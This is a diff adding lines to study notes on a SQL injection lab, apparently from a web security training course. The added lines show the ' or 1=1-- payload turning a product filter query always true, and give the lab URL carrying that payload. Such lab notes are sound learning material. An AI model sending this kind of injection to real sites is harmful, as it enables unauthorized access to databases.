@@ -27,3 +27,12 @@ SELECT * FROM products WHERE category = ''--' AND released = 1
 ```
 SELECT * FROM products WHERE category = ''
 ```
+- now we need to display all the products in any category, including categories that they don't know about
+- as we learnt from the academics we can insert (or 1=1 ) so our query will look like this
+```
+SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
+```
+- and we solved the lab with this url
+```
+https://0aa100aa03460e178277bf9200a400f4.web-security-academy.net/filter?category=' or 1=1--
+```
